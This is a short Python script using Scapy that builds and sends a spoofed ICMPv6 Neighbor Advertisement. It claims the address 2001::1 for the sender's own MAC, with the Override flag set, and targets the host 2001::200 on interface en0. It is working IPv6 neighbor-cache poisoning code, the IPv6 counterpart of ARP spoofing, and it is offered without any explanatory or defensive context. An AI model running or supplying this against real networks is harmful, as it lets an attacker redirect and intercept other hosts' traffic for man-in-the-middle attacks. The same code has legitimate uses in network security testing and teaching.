from  scapy.all import *
import sys
from mactoipv6linklocal import *
from Get_MAC import *
from icmpv6_ns import *


def icmpv6_na(spoofhost, dsthost, ifname):
    ll_mac = GET_MAC(ifname)
    print(ll_mac)
    ether = Ether(src=ll_mac,dst=icmpv6_ns(dsthost, ifname))
    ipv6 = IPv6(src=spoofhost, dst=mac_to_ipv6_linklocal(icmpv6_ns(dsthost, ifname)))
    neighbor_advertisement = ICMPv6ND_NA(tgt=spoofhost, R=0 , S=0, O=1)
    src_ll_addr = ICMPv6NDOptDstLLAddr(lladdr=ll_mac)
    packet = ether / ipv6 / neighbor_advertisement / src_ll_addr
    sendp(packet, iface=ifname)


if __name__ == "__main__":
    icmpv6_na("2001::1", "2001::200", "en0")
